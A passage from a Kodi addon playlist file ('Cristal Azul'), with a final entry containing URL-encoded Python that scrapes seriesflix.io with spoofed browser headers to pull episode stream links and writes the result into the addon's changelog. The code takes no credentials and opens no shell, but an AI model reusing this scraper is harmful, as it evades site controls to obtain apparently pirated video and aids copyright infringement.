%20.%2a%3f%20(.%2a%3f)%3c%5c%27%2c%20response)%5cr%5cn%20%20%20video%20%3d%20%5b%5d%5cr%5cn%20%20%20for%20item%20in%20items%3a%5cr%5cn%20%20%20%20%20%20%20url%20%3d%20%5c%27https%3a%2f%2fseriesflix.io%2f%3ftrembed%3d%5c%27%2bitem%5b0%5d%2b%5c%27%26trid%3d%5c%27%2btrid%2b%5c%27%26trtype%3d2%5c%27%5cr%5cn%20%20%20%20%20%20%20servidor%20%3d%20item%5b1%5d%5cr%5cn%20%20%20%20%20%20%20idioma%20%3d%20item%5b2%5d%5cr%5cn%20%20%20%20%20%20%20video%20%2b%3d%20%5b(url%2c%20idioma%2c%20servidor)%5d%5cr%5cn%20%20%20return%20video%5cr%5cn%20%20else%3a%5cr%5cn%20%20%20%20xbmc.executebuiltin(%5c%27PlayMedia(%22https%3a%2f%2fwww.ivoox.com%2flisten_mn_23681872_1.m4a%3finternal%3dHTML5%22%2c1)%5c%27)%5cr%5cn%20%20%20%20return%20xbmc.executebuiltin(%22XBMC.Notification(%5bCOLOR%20aqua%5dCristal%20Azul%20%5b%2fCOLOR%5d%2c%5bCOLOR%20gold%5d%20robado%20a%20cristal%20azul%5b%2fCOLOR%5d%2c%2025000)%22)%5cr%5cn%27%2c%20%27name%27%3a%20u%27link_final%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27final_url%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnurl%20%3d%20%5c%27%5blink_final.param1%5d%5c%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcgui%2cxbmcaddon%2crandom%5cr%5cndef%20GetLSProData(page_data%2cCookie_Jar%2cm%2curl%3durl)%3a%5cr%5cn%5cr%5cn%20%20%20%20%20dato%20%3d%20re.findall(%5c%27src%3d%22.%2a%3fh%3d(.%2a%3f)%22%5c%27%2c%20requests.get(url%2c%20headers%3d%7b%5c%27user-agent%5c%27%3a%5c%27Mozilla%2f5.0%5c%27%2c%5c%27referer%5c%27%3a%5c%27https%3a%2f%2fseriesflix.io%2fepisodio%2fbreaking-bad-1x1%2f%5c%27%2c%5c%27x-requested-with%5c%27%3a%5c%27XMLHttpRequest%5c%27%7d).content)%5b0%5d%5cr%5cn%20%20%20%20%20source_id%20%3d%20requests.post(%5c%27https%3a%2f%2fseriesflix.io%2fstreamcheck%2fr.php%5c%27%2c%20headers%3d%7b%5c%27user-agent%5c%27%3a%5c%27Mozilla%2f5.0%20(Windows%20NT%2010.0%3b%20Win64%3b%20x64%3b%20rv%3a84.0)%20Gecko%2f20100101%20Firefox%2f84.0%5c%27%2c%20%5c%27x-requested-with%5c%27%3a%5c%27XMLHttpRequest%5c%27%7d%2c%20data%3d%7b%5c%27h%5c%27%3adato%7d).url%5cr%5cn%20%20%20%20%20ArchivoDestino%20%3d%20xbmc.translatePath(%5c%27special%3a%2f%2fhome%2faddons%2fplugin.video.cristalazul%2f%5c%27)%5cr%5cn%20%20%20%20%20open(ArchivoDestino%20%2b%20%5c%27changelog.txt%5c%27%2c%5c%27wb%5c%27).write(source_id)%5cr%5cn%20%20%20%20%20return%20source_id%5cr%5cn%27%2c%20%27name%27%3a%20u%27final_url%27%2c%20%27page%27%3a%20u%27None%27%7d%7d&amp;url=%24doregex%5bmakelist2%5d</jsonrpc>
<thumbnail>https://i.imgur.com/5kY0BRB.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>
------------------------------------------------------------------------------------------


